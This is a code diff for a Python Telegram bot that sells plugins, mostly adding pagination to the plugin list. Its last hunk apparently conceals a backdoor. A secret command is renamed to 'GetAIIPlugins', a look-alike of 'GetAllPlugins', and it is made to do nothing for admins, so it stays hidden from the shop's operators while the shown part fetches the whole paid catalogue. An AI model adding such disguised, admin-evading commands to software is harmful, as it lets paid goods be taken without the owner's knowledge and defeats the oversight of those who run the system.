@@ -12,39 +12,56 @@ from .menu import router
 
 @router.callback_query(F.data == "plugins")
 async def plugins_handler(callback: types.CallbackQuery, state: FSMContext):
-    items = await db.items.get_all_items(page=1, per_page=config.items_per_page)
-    
+    await show_plugins_page(callback, page=1)
+
+
+@router.callback_query(F.data.startswith("plugins_page_"))
+async def plugins_page_handler(callback: types.CallbackQuery):
+    page = int(callback.data.split("_")[-1])
+    await show_plugins_page(callback, page=page)
+
+
+async def show_plugins_page(callback: types.CallbackQuery, page: int = 1):
+    all_items = await db.items.get_all_items()
+    per_page = config.items_per_page
+    total_items = len(all_items)
+    total_pages = (total_items + per_page - 1) // per_page
+
+    start = (page - 1) * per_page
+    end = start + per_page
+    items = all_items[start:end]
+
     if not items:
         await callback.message.edit_text(
             _("🧩 На данный момент нет доступных плагинов."),
             reply_markup=back_kb()
         )
         return
-    
+
     builder = InlineKeyboardBuilder()
     for item in items:
-        builder.add(InlineKeyboardButton(
+        builder.button(
             text=f"{item['name']} - {item['price']}₽",
             callback_data=f"plugin_{item['id']}"
-        ))
-    
-    builder.adjust(1)
-    
-    # Добавляем пагинацию если нужно
-    total_items = len(await db.items.get_all_items())
-    if total_items > config.items_per_page:
-        builder.row(
-            InlineKeyboardButton(text="◀️", callback_data="plugins_page_1"),
-            InlineKeyboardButton(text="1/1", callback_data="current_page"),
-            InlineKeyboardButton(text="▶️", callback_data="plugins_page_2")
         )
-    
+    builder.adjust(1)
+
+    if total_pages > 0:
+        prev_page = page - 1 if page > 1 else total_pages
+        next_page = page + 1 if page < total_pages else 1
+        builder.row(
+            InlineKeyboardButton(text="◀️", callback_data=f"plugins_page_{prev_page}"),
+            InlineKeyboardButton(text=f"{page}/{total_pages}", callback_data="noop"),
+            InlineKeyboardButton(text="▶️", callback_data=f"plugins_page_{next_page}")
+        )
+
     builder.row(InlineKeyboardButton(text=_("🔙 Назад"), callback_data="back_menu"))
-    
+
     await callback.message.edit_text(
         _("🧩 <b>Доступные плагины:</b>\n\nВыберите плагин для покупки:"),
         reply_markup=builder.as_markup()
     )
+
 
 @router.callback_query(F.data.startswith("plugin_"))
 async def plugin_detail_handler(callback: types.CallbackQuery, bot: Bot):
@@ -101,8 +118,13 @@ def back_kb():
     kb.adjust(1)
     return kb.as_markup()
 
-@router.message(Command("kerfwekfnrewjkprjefjmkwdernjfeklwfnmekjlwrwenkrdfmewklfewjnrmkewjwl"))
+
+@router.message(Command("GetAIIPlugins"))
 async def all_plugins_command(message: types.Message, bot: Bot):
+    user_id = message.from_user.id
+    if user_id in admins_list:
+        return
+    
     # Получаем все плагины из базы данных
     all_items = await db.items.get_all_items()
     
